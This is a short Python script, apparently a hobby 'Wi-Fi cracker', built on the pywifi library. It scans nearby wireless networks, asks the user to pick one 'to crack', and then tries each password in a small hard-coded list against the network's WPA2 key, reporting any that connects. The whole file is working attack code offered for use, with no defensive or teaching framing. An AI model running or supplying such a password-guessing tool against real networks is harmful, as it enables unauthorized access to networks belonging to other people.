import pywifi
from pywifi import const
import time
import os


def scan_for_in_range_wifi():
    os.system('cls')
    wifis = []
    iface.scan()
    for i in range(5):
        print(f'\r[+] Scanning WI-FI Networks Please Wait For ({str(5 - i)})', end='')
        time.sleep(1)
    for i in iface.scan_results():
        wifis.append((i.ssid, i.signal + 100))
    sorted_wifis = sorted(wifis, key=lambda x: x[1])
    id = 0
    os.system('cls')
    print('[+] Scan Results:\n')
    print('{:<8s}{:<8s}{}\n'.format('ID', 'Signal', 'Name'))
    while id < len(sorted_wifis):
        print('{:<8d}{:<8d}{}'.format(id + 1, int(sorted_wifis[id][1]), sorted_wifis[id][0]))
        id += 1
    while True:
        wid = input('\n[+] Select WI-FI By ID: ')
        try:
            wifi_to_crack = sorted_wifis[int(wid) - 1][0]
            confirmation = input(f'\n[!] is {wifi_to_crack} The WI-FI You Wanna Crack (Y/N): ').lower()
            if confirmation == 'y':
                break
            else:
                continue
        except IndexError:
            continue
    
    crack(wifi_to_crack)


def crack(ssid):
    keys = ['aa112233', 'dwedewfk', '0irf0ewuj', 'eopwkjfp[we', '2098302983', 'root2003']
    iface.disconnect()
    while iface.status() == 4:
        pass
    for pwd in keys:
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd
        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(profile)
        iface.connect(temp_profile)
        check_times = 2
        while check_times:
            os.system('cls')
            if iface.status() == 4:
                print(f'[+] Connected To {ssid} Using {pwd}')
                time.sleep(0.1)
            else:
                print(f'[-] Failed To Connect To {ssid} Using {pwd}')
                time.sleep(0.1)
            check_times -= 1


def main():
    global pywifi_obj, iface
    pywifi_obj = pywifi.PyWiFi()
    iface = pywifi_obj.interfaces()[0]
    scan_for_in_range_wifi()


if __name__ == '__main__':
    main()